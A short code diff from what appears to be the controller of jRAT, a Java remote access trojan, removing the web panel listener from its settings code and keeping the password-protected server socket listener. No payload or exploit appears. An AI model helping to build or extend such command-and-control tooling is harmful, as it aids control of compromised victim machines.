@@ -9,7 +9,6 @@ import jrat.controller.exceptions.InvalidSocketTypeException;
 import jrat.controller.net.PortListener;
 import jrat.controller.net.ServerListener;
 import jrat.controller.ui.Columns;
-import jrat.controller.webpanel.WebPanelListener;
 
 import javax.swing.*;
 import java.io.*;
@@ -249,9 +248,6 @@ public class Settings extends AbstractStorable {
 				if (type == SocketType.SOCKET_NORMAL) {
 					ServerListener connection = new ServerListener(name, port, timeout, pass);
 					connection.start();
-				} else if (type == SocketType.SOCKET_WEB_PANEL) {
-					WebPanelListener wpl = new WebPanelListener(name, port, pass);
-					wpl.start();
 				} else {
 					throw new InvalidSocketTypeException();
 				}
